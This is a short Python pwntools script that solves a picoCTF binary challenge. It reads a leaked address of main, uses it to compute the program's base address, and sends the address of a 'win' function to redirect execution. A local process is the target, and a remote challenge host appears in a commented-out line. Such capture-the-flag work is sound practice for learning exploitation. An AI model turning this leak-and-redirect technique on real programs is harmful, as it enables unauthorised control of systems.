from pwn import *

elf = ELF("./vuln")
p = process("./vuln")
#p = remote("rescued-float.picoctf.net", 63205)

p.recvuntil(b"main: ")

leak_main = int(p.recvline().strip(),16)
log.info(f"leak main address: {hex(leak_main)}")

main = elf.sym['main']
log.info(f"main: {hex(main)}")

base_addr = leak_main - main
log.info(f"base address: {hex(base_addr)}")

win = elf.sym['win']

win_addr = base_addr + win
log.info(f"win address: {hex(win_addr)}")

pay = f"{win_addr:x}".encode()
print(pay)

p.sendlineafter(b": ",pay)

p.interactive()
